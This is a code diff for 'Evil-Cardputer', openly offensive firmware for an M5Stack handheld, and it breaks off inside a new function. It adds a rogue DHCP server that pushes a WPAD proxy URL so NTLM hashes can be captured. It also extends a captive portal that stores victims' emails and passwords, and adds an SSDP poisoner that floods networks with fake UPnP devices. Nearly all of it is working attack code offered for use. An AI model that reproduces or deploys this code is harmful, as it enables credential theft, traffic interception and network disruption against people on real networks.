@@ -43,6 +43,13 @@ typedef struct {
   uint8_t  buffer[64]; // bloc en cours
 } MD5U_CTX;
 
+enum SearchKind {
+  SK_All,
+  SK_Root,
+  SK_UUID,
+  SK_DevType,
+  SK_Other
+};
 
 #include <WiFi.h>
 #include <WebServer.h>
@@ -180,7 +187,8 @@ static const char * const PROGMEM menuItems[] = {
   "Bluetooth Keyboard",
   "Reverse TCP Tunnel",
   "DHCP Starvation",
-  "Rogue DHCP",
+  "Rogue DHCP STA",
+  "Rogue DHCP AP",
   "Switch DNS",
   "Network Hijacking",
   "Detect Printer",
@@ -202,6 +210,7 @@ static const char * const PROGMEM menuItems[] = {
   "SIP Flooding",
   "SIP Ring All",
   "CCTV Toolkit",
+  "SSDP Poisoner",
   "Settings",
 };
 
@@ -542,6 +551,7 @@ void releaseBLE() {
 
   Serial.println(F("NimBLE fully released and memory freed."));
 }
+
 
 
 void setup() {
@@ -990,7 +1000,7 @@ void setup() {
   // Textes à afficher
   const char* text1 = "Evil-Cardputer";
   const char* text2 = "By 7h30th3r0n3";
-  const char* text3 = "v1.4.4 2025";
+  const char* text3 = "v1.4.5 2025";
 
   // Mesure de la largeur du texte et calcul de la position du curseur
   int text1Width = M5.Lcd.textWidth(text1);
@@ -1020,7 +1030,7 @@ void setup() {
   Serial.println(F("-------------------"));
   Serial.println(F("Evil-Cardputer"));
   Serial.println(F("By 7h30th3r0n3"));
-  Serial.println(F("v1.4.4 2025"));
+  Serial.println(F("v1.4.5 2025"));
   Serial.println(F("-------------------"));
   // Diviser randomMessage en deux lignes pour s'adapter à l'écran
   int maxCharsPerLine = screenWidth / 10;  // Estimation de 10 pixels par caractère
@@ -1522,7 +1532,8 @@ void drawMenu() {
 
 
 
-
+enum RogueDhcpMode : uint8_t { ROGUE_DHCP_STA = 0, ROGUE_DHCP_AP = 1 };
+void rogueDHCP(RogueDhcpMode mode);
 
 void executeMenuItem(int index) {
   inMenu = false;
@@ -1576,29 +1587,31 @@ void executeMenuItem(int index) {
     case 45: initBluetoothKeyboard(); break;
     case 46: reverseTCPTunnel(); break;
     case 47: startDHCPStarvation(); break;
-    case 48: rogueDHCP(); break;
-    case 49: switchDNS(); break;
-    case 50: DHCPAttackAuto(); break;
-    case 51: detectPrinter(); break;
-    case 52: printFile(); break;
-    case 53: checkPrinterStatus(); break;
-    case 54: startHoneypot(); break;
-    case 55: evilLLMChatStream(); break;
-    case 56: EvilChatMesh(); break;
-    case 57: sdToUsb(); break;
-    case 58: responder(); break;
-    case 59: wpadAbuse(); break;
-    case 60: crackNTLMv2(); break;
-    case 61: CleanNTLMHashes(); break;
-    case 62: fileManager(); break;
-    case 63: startUARTShell(); break;
-    case 64: sipScan(); break;
-    case 65: sipEnumExtensions(); break;
-    case 66: sipSpoofMessage(); break;
-    case 67: sipFlood(); break;
-    case 68: sipRingAll(); break;
-    case 69: scanCCTVCameras(); break;
-    case 70: showSettingsMenu(); break;
+    case 48: rogueDHCP(ROGUE_DHCP_STA); break;
+    case 49: rogueDHCP(ROGUE_DHCP_AP); break;
+    case 50: switchDNS(); break;
+    case 51: DHCPAttackAuto(); break;
+    case 52: detectPrinter(); break;
+    case 53: printFile(); break;
+    case 54: checkPrinterStatus(); break;
+    case 55: startHoneypot(); break;
+    case 56: evilLLMChatStream(); break;
+    case 57: EvilChatMesh(); break;
+    case 58: sdToUsb(); break;
+    case 59: responder(); break;
+    case 60: wpadAbuse(); break;
+    case 61: crackNTLMv2(); break;
+    case 62: CleanNTLMHashes(); break;
+    case 63: fileManager(); break;
+    case 64: startUARTShell(); break;
+    case 65: sipScan(); break;
+    case 66: sipEnumExtensions(); break;
+    case 67: sipSpoofMessage(); break;
+    case 68: sipFlood(); break;
+    case 69: sipRingAll(); break;
+    case 70: scanCCTVCameras(); break;
+    case 71: fakeSSDP(); break;
+    case 72: showSettingsMenu(); break;
   }
   isOperationInProgress = false;
 }
@@ -2480,6 +2493,12 @@ void handleCookieSiphoning() {
 
 
 
+/*
+============================================================================================================================
+Captive portal
+============================================================================================================================
+*/
+
 void handleLogRequest() {
   // Récupérer les cookies
   String cookies = server.arg("cookies");
@@ -2525,11 +2544,34 @@ function FindProxyForURL(url, host) {
 )RAW";
 
 
-/*
-============================================================================================================================
-Captive portal
-============================================================================================================================
-*/
+void servePortalFileWithReplace(const String &path, const String &replaceIP) {
+    File f = SD.open(path);
+    if (!f) {
+        server.send(404, "text/plain", "File not found");
+        return;
+    }
+
+    // En-tête HTTP
+    server.setContentLength(CONTENT_LENGTH_UNKNOWN);
+    server.send(200, "text/html", "");
+    
+    const size_t bufSize = 512;
+    char buf[bufSize + 1]; // +1 pour terminer la string
+
+    while (f.available()) {
+        size_t len = f.readBytes(buf, bufSize);
+        buf[len] = '\0'; // sécurité
+
+        String chunk(buf);
+        chunk.replace("192.168.4.1", replaceIP);
+        server.sendContent(chunk);
+    }
+
+    f.close();
+    server.sendContent(""); // flush
+    server.client().stop();
+}
+
 
 
 void createCaptivePortal() {
@@ -2580,18 +2622,36 @@ void createCaptivePortal() {
   });
   
   server.on("/", HTTP_GET, []() {
-    String email = server.arg("email");
-    String password = server.arg("password");
-    if (!email.isEmpty() && !password.isEmpty()) {
-      saveCredentials(email, password, selectedPortalFile.substring(12), clonedSSID); // Assurez-vous d'utiliser les bons noms de variables
-      server.send(200, "text/plain", "Credentials Saved");
-    } else {
-      Serial.println(F("-------------------"));
-      Serial.println(F("Direct Web Access !!!"));
-      Serial.println(F("-------------------"));
-      servePortalFile(selectedPortalFile);
-    }
+      String email = server.arg("email");
+      String password = server.arg("password");
+  
+      if (!email.isEmpty() && !password.isEmpty()) {
+          // Sauvegarde des credentials
+          saveCredentials(email, password, selectedPortalFile.substring(12), clonedSSID);
+          server.send(200, "text/plain", "Credentials Saved");
+      } else {
+          Serial.println(F("-------------------"));
+          Serial.println(F("Direct Web Access !!!"));
+          Serial.println(F("-------------------"));
+  
+          IPAddress clientIP = server.client().remoteIP();
+          if (clientIP[0] == 192 && clientIP[1] == 168 && clientIP[2] == 4) {
+              // Client 192.168.4.0/24
+              File f = SD.open(selectedPortalFile);
+              if (f) {
+                  server.streamFile(f, "text/html");
+                  f.close();
+              } else {
+                  server.send(404, "text/plain", "File not found");
+              }
+          } else {
+              // Client external
+              servePortalFileWithReplace(selectedPortalFile, ipSTA.toString());
+          }
+      }
   });
+
+
 
 
 
@@ -3221,11 +3281,11 @@ enum {
   MsvAvDnsDomainName   = 0x0004
 };
 
-static void pushUTF16LE(std::vector<uint8_t>& v, const char* ascii) {
+void pushUTF16LE(std::vector<uint8_t>& v, const char* ascii) {
   while (*ascii) { push8(v, (uint8_t)*ascii); push8(v, 0x00); ++ascii; }
 }
 
-static void avPair(std::vector<uint8_t>& ti, uint16_t type, const char* ascii) {
+void avPair(std::vector<uint8_t>& ti, uint16_t type, const char* ascii) {
   std::vector<uint8_t> val; pushUTF16LE(val, ascii);
   le16(ti, type);
   le16(ti, (uint16_t)val.size());
@@ -3233,8 +3293,8 @@ static void avPair(std::vector<uint8_t>& ti, uint16_t type, const char* ascii) {
 }
 
 std::vector<uint8_t> buildType2Challenge() {
-  const char* TargetNameAscii = "EVILGROUP";
-  const char* NbDomain        = "EVILGROUP";
+  const char* TargetNameAscii = "EVILM5"; 
+  const char* NbDomain        = "EVILM5";
   const char* NbComputer      = "EVILPROXY";
   const char* DnsDomain       = "lan";
   const char* DnsComputer     = "evilm5.lan";
@@ -3483,7 +3543,7 @@ static inline uint16_t rgb565(uint8_t r,uint8_t g,uint8_t b){
   return ((r & 0xF8) << 8) | ((g & 0xFC) << 3) | (b >> 3);
 }
 
-static void hsv2rgb(uint16_t H, uint8_t S, uint8_t V, uint8_t &r, uint8_t &g, uint8_t &b) {
+void hsv2rgb(uint16_t H, uint8_t S, uint8_t V, uint8_t &r, uint8_t &g, uint8_t &b) {
   // H: 0..359, S/V: 0..255
   if (S == 0) { r = g = b = V; return; }
   uint16_t region = H / 60;
@@ -3504,12 +3564,12 @@ static void hsv2rgb(uint16_t H, uint8_t S, uint8_t V, uint8_t &r, uint8_t &g, ui
   }
 }
 
-static inline uint16_t hsv565(uint16_t h, uint8_t s, uint8_t v){
+inline uint16_t hsv565(uint16_t h, uint8_t s, uint8_t v){
   uint8_t r,g,b; hsv2rgb(h%360, s, v, r, g, b); return rgb565(r,g,b);
 }
 
 // easing pour animations plus “vivantes”
-static inline float easeInOutSine(float x){
+inline float easeInOutSine(float x){
   return -0.5f * (cosf(PI * x) - 1.0f);
 }
 
@@ -3702,6 +3762,9 @@ void updateHashUiNTLM() {
 
 // =================== Setup / Loop ===================
 void wpadAbuse() {
+  dnsServer.stop();
+  server.stop();
+  
   M5.Lcd.fillScreen(BLACK);
   inMenu = false;
   isOperationInProgress = true;
@@ -3726,7 +3789,9 @@ void wpadAbuse() {
   ipAP  = WiFi.softAPIP();
   ipSTA = WiFi.localIP();
 
-  dnsServer.start(53, "*", ipAP);
+  if (!dnsServer.start(53, "*", ipAP)) {
+    Serial.println("[-] DNS Server failed to start!");
+  }
   proxy.begin();
   Serial.println("[+] DNS + Proxy NTLM active");
 
@@ -3754,7 +3819,7 @@ void wpadAbuse() {
       }
     }
   }
-}
+} 
 
 
 
@@ -7610,9 +7675,9 @@ Wardriving
 
 String createPreHeader() {
   String preHeader = "WigleWifi-1.4";
-  preHeader += ",appRelease=v1.4.4"; // Remplacez [version] par la version de votre application
+  preHeader += ",appRelease=v1.4.5"; // Remplacez [version] par la version de votre application
   preHeader += ",model=Cardputer";
-  preHeader += ",release=v1.4.4"; // Remplacez [release] par la version de l'OS de l'appareil
+  preHeader += ",release=v1.4.5"; // Remplacez [release] par la version de l'OS de l'appareil
   preHeader += ",device=Evil-Cardputer"; // Remplacez [device name] par un nom de périphérique, si souhaité
   preHeader += ",display=7h30th3r0n3"; // Ajoutez les caractéristiques d'affichage, si pertinent
   preHeader += ",board=M5Cardputer";
@@ -12288,7 +12353,7 @@ unsigned long lastLog = 0;
 int currentScreen   = 1;  // 1=GeneralInfo, 2=ReceivedData
 
 const String wigleHeaderFileFormat =
-  "WigleWifi-1.4,appRelease=v1.4.4,model=Cardputer,release=v1.4.4,"
+  "WigleWifi-1.4,appRelease=v1.4.5,model=Cardputer,release=v1.4.5,"
   "device=Evil-Cardputer,display=7h30th3r0n3,board=M5Cardputer,brand=M5Stack";
 
 char* log_col_names[LOG_COLUMN_COUNT] = {
@@ -14374,7 +14439,7 @@ const int maxLinesRogue = 10;         // Number of lines to display
 String displayLinesRogue[10];         // Array to store the last lines
 int currentLineRogue = 0;             // Index of the current line
 
-uint8_t availableIpSuffixesRogue[] = {101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150};
+uint8_t availableIpSuffixesRogue[] = {101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111};
 const int numAvailableIps = sizeof(availableIpSuffixesRogue) / sizeof(availableIpSuffixesRogue[0]);
 bool ipAllocatedRogue[numAvailableIps] = {false}; // Track allocated IPs
 
@@ -14393,19 +14458,35 @@ void initClients() {
   }
 }
 
-void rogueDHCP() {
-  rogueIPRogue = WiFi.localIP();
-  currentSubnetRogue = WiFi.subnetMask();
-  currentGatewayRogue = WiFi.localIP();
-  currentDNSRogue = WiFi.localIP();
+void rogueDHCP(RogueDhcpMode mode) {
+  if (mode == ROGUE_DHCP_STA) {
+    rogueIPRogue       = WiFi.localIP();
+    currentSubnetRogue = WiFi.subnetMask();
+    currentGatewayRogue= WiFi.localIP();
+    currentDNSRogue    = WiFi.localIP();
+    Serial.println(F("[+] Rogue DHCP using STA interface"));
+  } else { // ROGUE_DHCP_AP
+    rogueIPRogue       = WiFi.softAPIP();
+    currentSubnetRogue = WiFi.softAPSubnetMask();
+    currentGatewayRogue= WiFi.softAPIP();
+    currentDNSRogue    = WiFi.softAPIP();
+    WiFi.mode(WIFI_MODE_AP);
+    Serial.println(F("[+] Rogue DHCP using AP interface"));
+  }
 
   initClients(); // Initialize client info
-  if (isCaptivePortalOn) {
-    dnsServer.stop();  // stop temporary DNS to free port 53
-    delay(100);
+
+  // Stop DHCP interne AP si mode AP (important pour libérer port 67)
+  if (mode == ROGUE_DHCP_AP) {
+    tcpip_adapter_dhcps_stop(TCPIP_ADAPTER_IF_AP);
+    Serial.println(F("[AP] DHCP server stopped."));
   }
+
   if (!udp.begin(localUdpPort)) {
     Serial.println(F("Error: UDP port 67 start failed."));
+    if (mode == ROGUE_DHCP_AP) {
+      tcpip_adapter_dhcps_start(TCPIP_ADAPTER_IF_AP);  // rollback
+    }
     waitAndReturnToMenu("Error: UDP start failed.");
     return;
   }
@@ -14418,6 +14499,7 @@ void rogueDHCP() {
     M5.update();
     M5Cardputer.update();
     handleDnsRequestSerial();
+
     if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
       Serial.println(F("Returning to menu."));
       updateDisplay("Returning...");
@@ -14434,27 +14516,19 @@ void rogueDHCP() {
       udp.read(packetBufferRogue, packetSizeRogue);
 
       uint8_t messageTypeRogue = getDHCPMessageType(packetBufferRogue, packetSizeRogue);
-
-      uint8_t offeredIpSuffix = 0; // suffixe IP attribué
+      uint8_t offeredIpSuffix = 0; 
 
       if (messageTypeRogue == 1) { // DHCP Discover
         Serial.println(F("DHCP Discover received. Preparing Offer..."));
         updateDisplay("Discover. Preparing Offer...");
-
         prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 2, offeredIpSuffix);
-
-        // Send the DHCP Offer (broadcast)
         sendDHCPResponse(packetBufferRogue, packetSizeRogue, false, offeredIpSuffix);
         Serial.println(F("DHCP Offer sent."));
         updateDisplay("Offer sent.");
-
       } else if (messageTypeRogue == 3) { // DHCP Request
         Serial.println(F("DHCP Request received. Preparing ACK..."));
         updateDisplay("Request. Preparing ACK...");
-
         prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 5, offeredIpSuffix);
-
-        // Send the DHCP ACK (unicast vers client)
         sendDHCPResponse(packetBufferRogue, packetSizeRogue, true, offeredIpSuffix);
         Serial.println(F("DHCP ACK sent."));
         updateDisplay("ACK sent.");
@@ -14462,10 +14536,13 @@ void rogueDHCP() {
     }
   }
 
-  if (isCaptivePortalOn) {
-    dnsServer.start(53, "*", WiFi.softAPIP()); // restart DNS redirect
+  // Relancer DHCP interne si on était en AP
+  if (mode == ROGUE_DHCP_AP) {
+    tcpip_adapter_dhcps_start(TCPIP_ADAPTER_IF_AP);
+    Serial.println(F("[AP] DHCP server (re)started (tcpip_adapter)."));
   }
 }
+
 
 
 uint8_t getDHCPMessageType(uint8_t *packetRogue, int packetSizeRogue) {
@@ -14648,6 +14725,14 @@ void prepareDHCPResponse(uint8_t *packetRogue, int &packetSizeRogue, uint8_t mes
   packetRogue[optionIndexRogue++] = 0x01;
   packetRogue[optionIndexRogue++] = 0x51;
   packetRogue[optionIndexRogue++] = 0x80; // 86400s
+
+  // Domain Name (15) → suffixe DNS cohérent avec Option 252
+  const char domainName[] = "evilm5.lan";
+  uint8_t domainLen = strlen(domainName);
+  packetRogue[optionIndexRogue++] = 15;
+  packetRogue[optionIndexRogue++] = domainLen;
+  memcpy(&packetRogue[optionIndexRogue], domainName, domainLen);
+  optionIndexRogue += domainLen;
   
   // WPAD (252) → URL du proxy
   const char wpadUrl[] = "http://evilm5.lan/wpad.dat";
@@ -22266,9 +22351,9 @@ static const uint32_t STREAM_NO_DATA_TIMEOUT_MS = 5000; // 5s: plus de data en l
 static const size_t   IO_CHUNK = 3840;
 
 // fichiers temporaires
-static const char* SD_TMP_DIR      = "/tmp";
-static const char* SD_FILE_A       = "/tmp/mjpeg_a.jpg";
-static const char* SD_FILE_B       = "/tmp/mjpeg_b.jpg";
+static const char* SD_TMP_DIR      = "/evil/tmp";
+static const char* SD_FILE_A       = "/evil/tmp/mjpeg_a.jpg";
+static const char* SD_FILE_B       = "/evil/tmp/mjpeg_b.jpg";
 static const char* SPIFFS_FILE_A   = "/a.jpg";
 static const char* SPIFFS_FILE_B   = "/b.jpg";
 
@@ -24190,4 +24275,497 @@ void CleanNTLMHashes() {
   }
   waitAndReturnToMenu("Back To Main Menu");
 
+}
+
+
+
+#include <WiFi.h>
+#include <WebServer.h>
+#include <WiFiUdp.h>
+#include <SD.h>
+#include <time.h>
+
+// === Réseau SSDP ===
+WiFiUDP udpSSDP;
+WebServer ssdpServer(80);
+bool isFakeSSDPActive = false;
+
+int ssdpSearchCount = 0;
+long ssdpSentCount = 0;
+String lastSSDPClient = "";
+String lastSSDPService = "";
+int ssdpDeviceCount = 50;  // choisi par l’utilisateur au runtime
+
+// Types connus
+const char* kTypes[] = {
+  // === Médias (50) ===
+  "urn:schemas-upnp-org:device:MediaServer:1",
+  "urn:schemas-upnp-org:device:MediaRenderer:1",
+
+  // === Imprimantes / scanners (50) ===
+  "urn:schemas-upnp-org:device:Printer:1",
+  "urn:schemas-upnp-org:device:Scanner:1",
+
+  // === Réseau (50) ===
+  "urn:schemas-upnp-org:device:InternetGatewayDevice:1",
+  "urn:schemas-upnp-org:device:LANDevice:1",
+
+  // === Domotique (50) ===
+  "urn:schemas-upnp-org:device:DimmableLight:1",
+
+  // === Autres périphériques (50) ===
+  "urn:schemas-upnp-org:device:Camera:1",
+
+};
+
+int kTypeCount = sizeof(kTypes)/sizeof(kTypes[0]);
+
+#define MAX_SSDP_DEVICES 300
+#define SSDP_MAX_UDP     512
+#define NAME_MAX_LEN     32
+
+// === Tables globales ===
+char gNames[MAX_SSDP_DEVICES][NAME_MAX_LEN+1];
+int  gNameCount = 0;
+
+struct Dev {
+  char uuid[37];
+  const char* type;
+};
+Dev gDevs[MAX_SSDP_DEVICES];
+
+// === Utils ===
+bool clockIsValid() {
+  time_t now = time(nullptr);
+  return now > 1609459200UL;
+}
+
+void makeUuidV4(char out[37]) {
+  uint8_t b[16];
+  for (int i=0;i<16;i++) b[i] = (uint8_t)(esp_random() & 0xFF);
+  b[6] = (b[6] & 0x0F) | 0x40;
+  b[8] = (b[8] & 0x3F) | 0x80;
+  sprintf(out,
+    "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
+    b[0],b[1],b[2],b[3], b[4],b[5], b[6],b[7],
+    b[8],b[9], b[10],b[11],b[12],b[13],b[14],b[15]);
+}
+
+void trimInPlace(char* s) {
+  int n = strlen(s);
+  while (n>0 && (s[n-1]=='\r' || s[n-1]=='\n' || s[n-1]==' ' || s[n-1]=='\t')) s[--n]=0;
+  int i=0; while (s[i]==' ' || s[i]=='\t') i++;
+  if (i>0) memmove(s, s+i, strlen(s+i)+1);
+}
+
+void loadDeviceNames() {
+  gNameCount = 0;
+  File f = SD.open("/evil/config/SSDPName.txt");
+  if (!f) {
+    Serial.println("[-] SSDPName.txt introuvable -> fallback Evil-###");
+    return;
+  }
+  char line[128]; int pos=0;
+  while (f.available() && gNameCount < ssdpDeviceCount) {
+    int c = f.read();
+    if (c < 0) break;
+    if (c == '\r') continue;
+    if (c == '\n') {
+      line[pos] = 0; trimInPlace(line);
+      if (line[0]) {
+        strncpy(gNames[gNameCount], line, NAME_MAX_LEN);
+        gNames[gNameCount][NAME_MAX_LEN] = 0;
+        gNameCount++;
+      }
+      pos = 0;
+    } else {
+      if (pos < (int)sizeof(line)-1) line[pos++] = (char)c;
+    }
+  }
+  if (pos>0 && gNameCount < ssdpDeviceCount) {
+    line[pos]=0; trimInPlace(line);
+    if (line[0]) {
+      strncpy(gNames[gNameCount], line, NAME_MAX_LEN);
+      gNames[gNameCount][NAME_MAX_LEN] = 0;
+      gNameCount++;
+    }
+  }
+  f.close();
+  Serial.printf("[*] Noms chargés: %d\n", gNameCount);
+}
+
+void getFriendlyName(int idx, char* out, size_t outsz) {
+  if (gNameCount == 0) {
+    // Aucun nom chargé, fallback Evil-###
+    snprintf(out, outsz, "Evil-%03d", idx);
+  } else if (idx < gNameCount) {
+    // Utiliser le nom exact de la liste
+    strncpy(out, gNames[idx], outsz - 1);
+    out[outsz - 1] = 0;
+  } else {
+    // Plus d’entrées que de noms → recycler avec modulo
+    int base = idx % gNameCount;
+    snprintf(out, outsz, "%s-%d", gNames[base], idx);
+  }
+}
+
+
+// === SCPD minimal ===
+void registerScpdRoutesOnce() {
+  ssdpServer.on("/cmr.xml", HTTP_GET, []() {
+    const char* xml =
+      "<?xml version=\"1.0\"?>"
+      "<scpd xmlns=\"urn:schemas-upnp-org:service-1-0\">"
+        "<specVersion><major>1</major><minor>0</minor></specVersion>"
+        "<actionList/>"
+        "<serviceStateTable/>"
+      "</scpd>";
+    ssdpServer.send(200, "text/xml; charset=\"utf-8\"", xml);
+  });
+  ssdpServer.on("/cmr_control", HTTP_ANY, [](){ ssdpServer.send(200, "text/plain", "OK"); });
+  ssdpServer.on("/cmr_event",   HTTP_ANY, [](){ ssdpServer.send(200, "text/plain", "OK"); });
+
+  ssdpServer.onNotFound([](){
+    String uri = ssdpServer.uri();
+    int idx = -1;
+    if (uri.startsWith("/desc") && uri.endsWith(".xml")) {
+      if (sscanf(uri.c_str(), "/desc%d.xml", &idx) == 1 && idx >= 0 && idx < ssdpDeviceCount) {
+        IPAddress locIP = (WiFi.localIP().toString() != "0.0.0.0") ? WiFi.localIP() : WiFi.softAPIP();
+        char friendly[NAME_MAX_LEN+16]; getFriendlyName(idx, friendly, sizeof(friendly));
+
+        char xml[768];
+        snprintf(xml, sizeof(xml),
+          "<?xml version=\"1.0\"?>"
+          "<root xmlns=\"urn:schemas-upnp-org:device-1-0\">"
+            "<specVersion><major>1</major><minor>0</minor></specVersion>"
+            "<device>"
+              "<deviceType>%s</deviceType>"
+              "<friendlyName>%s</friendlyName>"
+              "<manufacturer>Evil-M5Project</manufacturer>"
+              "<modelName>%s</modelName>"
+              "<UDN>uuid:%s</UDN>"
+              "<serviceList>"
+                "<service>"
+                  "<serviceType>urn:schemas-upnp-org:service:ConnectionManager:1</serviceType>"
+                  "<serviceId>urn:upnp-org:serviceId:ConnectionManager</serviceId>"
+                  "<SCPDURL>/cmr.xml</SCPDURL>"
+                  "<controlURL>/cmr_control</controlURL>"
+                  "<eventSubURL>/cmr_event</eventSubURL>"
+                "</service>"
+              "</serviceList>"
+              "<presentationURL>http://%s:80/</presentationURL>"
+            "</device>"
+          "</root>",
+          gDevs[idx].type, friendly, friendly, gDevs[idx].uuid, locIP.toString().c_str()
+        );
+        ssdpServer.send(200, "text/xml; charset=\"utf-8\"", xml);
+        return;
+      }
+    }
+    ssdpServer.send(404, "text/plain", "Not found");
+  });
+}
+
+
+SearchKind classifyST(const String& st, String &normalized) {
+  String s = st; 
+  s.trim();
+  if (s.endsWith("\r")) s.remove(s.length()-1);
+  String sl = s;
+  sl.toLowerCase();
+
+  if (sl == "ssdp:all") {
+    normalized = "ssdp:all"; 
+    return SK_All;
+  }
+  if (sl == "upnp:rootdevice") {
+    normalized = "upnp:rootdevice"; 
+    return SK_Root;
+  }
+  if (sl.startsWith("uuid:")) {
+    normalized = s; 
+    return SK_UUID;
+  }
+  if (sl.startsWith("urn:schemas-upnp-org:device:")) {
+    normalized = s; 
+    return SK_DevType;
+  }
+
+  normalized = s;
+  return SK_Other;
+}
+bool gTypeEnabled[sizeof(kTypes)/sizeof(kTypes[0])];
+bool selectAll = true;
+
+// === Nettoyage affichage nom court ===
+String shortType(const char* full) {
+  String s = full;
+  int pos = s.lastIndexOf(":device:");
+  if (pos >= 0) s = s.substring(pos + 8); // garde juste après "device:"
+  int colon = s.lastIndexOf(":");
+  if (colon >= 0) s = s.substring(0, colon); // enlève :1 ou :2
+  return s;
+}
+
+// === Menu de sélection des types ===
+void selectTypesUI() {
+  for (int i = 0; i < kTypeCount; i++) gTypeEnabled[i] = true;
+  selectAll = true;
+  int cursor = 0;
+
+  // buffer état ancien
+  int oldCursor = -1;
+  bool oldSelectAll = !selectAll;
+  bool oldEnabled[kTypeCount]; 
+  for (int i=0;i<kTypeCount;i++) oldEnabled[i] = !gTypeEnabled[i];
+
+  while (true) {
+    // Redessine uniquement si changement
+    bool needRedraw = (cursor != oldCursor) || (selectAll != oldSelectAll);
+    for (int i=0;i<kTypeCount;i++) {
+      if (gTypeEnabled[i] != oldEnabled[i]) { needRedraw = true; break; }
+    }
+
+    if (needRedraw) {
+      auto& d = M5Cardputer.Display;
+      d.fillScreen(BLACK);
+      d.setTextSize(1.5);
+      d.setTextColor(TFT_WHITE, BLACK);
+
+      // Ligne Select All
+      d.setCursor(0, 0);
+      if (cursor == 0) d.print(">"); else d.print(" ");
+      d.printf("%s Select All\n", selectAll ? "[X]" : "[ ]");
+
+      // Liste des types
+      for (int i = 0; i < kTypeCount; i++) {
+        d.setCursor(0, (i+1)*13);
+        if (cursor == i+1) d.print(">"); else d.print(" ");
+        d.printf("%s %s", gTypeEnabled[i] ? "[X]" : "[ ]", shortType(kTypes[i]).c_str());
+      }
+
+      // maj état ancien
+      oldCursor = cursor;
+      oldSelectAll = selectAll;
+      for (int i=0;i<kTypeCount;i++) oldEnabled[i] = gTypeEnabled[i];
+    }
+
+    // Gestion clavier
+    M5Cardputer.update();
+    if (M5Cardputer.Keyboard.isKeyPressed('.')) { cursor++; if (cursor > kTypeCount) cursor = 0; delay(150);}
+    if (M5Cardputer.Keyboard.isKeyPressed(';')) { cursor--; if (cursor < 0) cursor = kTypeCount; delay(150);}
+    if (M5Cardputer.Keyboard.isKeyPressed('x')) {
+      if (cursor == 0) {
+        selectAll = !selectAll;
+        for (int i = 0; i < kTypeCount; i++) gTypeEnabled[i] = selectAll;
+      } else {
+        gTypeEnabled[cursor-1] = !gTypeEnabled[cursor-1];
+      }
+      delay(200); // debounce
+    }
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+      break; // validé
+    }
+  }
+}
+
+
+
+
+void prepareDevices() {
+  int idx = 0;
+  for (int i = 0; i < ssdpDeviceCount; i++) {
+    // trouver le prochain type activé
+    while (!gTypeEnabled[idx % kTypeCount]) idx++;
+    makeUuidV4(gDevs[i].uuid);
+    gDevs[i].type = kTypes[idx % kTypeCount];
+    idx++;
+  }
+}
+
+// === UI sur Cardputer ===
+void updateFakeSSDPUI() {
+  auto& d = M5Cardputer.Display;
+  d.fillScreen(BLACK);
+
+  d.setTextSize(2);
+  d.setTextColor(TFT_GREEN, BLACK);
+  d.setCursor(5, 5);
+  d.print("Poisoning SSDP");
+
+  d.setTextSize(1);
+  d.setTextColor(WHITE, BLACK);
+  d.setCursor(5, 30);
+  d.print("M-SEARCH recv: ");
+  d.setTextSize(2);
+  d.print(ssdpSearchCount);
+
+  d.setTextSize(1);
+  d.setCursor(0, 50);
+  d.print(lastSSDPService);
+
+  d.setTextSize(1);
+  d.setCursor(5, 70);
+  d.print("SSDP sent: ");
+  d.setTextSize(2);
+  d.print(ssdpSentCount);
+
+  d.setTextSize(1);
+  d.setCursor(5, 100);
+  d.print("Client: ");
+  d.setTextSize(2);
+  d.print(lastSSDPClient);
+
+  d.setTextSize(1);
+  d.setTextColor(TFT_DARKGREY, BLACK);
+  d.setCursor(5, d.height()-12);
+  d.print("Press BACKSPACE to exit");
+}
+
+void fakeSSDP() {
+  inMenu = false;
+
+  // 1. Demander combien de devices
+  M5Cardputer.Display.fillScreen(BLACK);
+  M5Cardputer.Display.setTextSize(1.5);
+  M5Cardputer.Display.setTextColor(TFT_WHITE, TFT_BLACK);
+  M5Cardputer.Display.setCursor(0, 0);
+  M5Cardputer.Display.print("How many devices? (1-300)");
+  String input = getUserInput();
+  int val = input.toInt();
+  if (val < 1) val = 1;
+  if (val > MAX_SSDP_DEVICES) val = MAX_SSDP_DEVICES;
+  ssdpDeviceCount = val;
+  Serial.printf("[*] User selected %d devices\n", ssdpDeviceCount);
+
+  // 2. Demander SD ou custom
+  bool useSD = confirmPopup("Use SSDPName.txt from SD?");
+  if (useSD) {
+    loadDeviceNames();
+  } else {
+    M5Cardputer.Display.fillScreen(BLACK);
+    M5Cardputer.Display.setTextSize(1.5);
+    M5Cardputer.Display.setTextColor(TFT_WHITE, TFT_BLACK);
+    M5Cardputer.Display.setCursor(0, 0);
+    M5Cardputer.Display.print("Custom name?");
+    String customName = getUserInput();
+    strncpy(gNames[0], customName.c_str(), NAME_MAX_LEN);
+    gNames[0][NAME_MAX_LEN] = 0;
+    gNameCount = 1;
+    Serial.printf("[*] Using custom name: %s\n", gNames[0]);
+  }
+
+   selectTypesUI();
+  prepareDevices();
+  registerScpdRoutesOnce();
+
+  if (!isFakeSSDPActive) {
+    server.stop();
+    ssdpServer.begin();
+
+    if (udpSSDP.beginMulticast(IPAddress(239,255,255,250), 1900)) {
+      isFakeSSDPActive = true;
+      ssdpSearchCount = 0;
+      ssdpSentCount = 0;
+      lastSSDPClient = "";
+      lastSSDPService = "";
+      Serial.println("[+] SSDP Poisoner activated");
+      updateFakeSSDPUI();
+    } else {
+      Serial.println("[-] SSDP listener failed");
+      waitAndReturnToMenu("SSDP Error");
+      return;
+    }
+  } else {
+    udpSSDP.stop();
+    isFakeSSDPActive = false;
+    Serial.println("[*] SSDP Poisoner stopped");
+    ssdpServer.stop();
+    server.begin();
+    waitAndReturnToMenu("SSDP Poisoner stopped");
+    return;
+  }
+
+  while (isFakeSSDPActive && !M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+    int packetSize = udpSSDP.parsePacket();
+    if (packetSize > 0) {
+      char buffer[SSDP_MAX_UDP];
+      int len = udpSSDP.read(buffer, sizeof(buffer)-1);
+      if (len > 0) buffer[len] = 0;
+
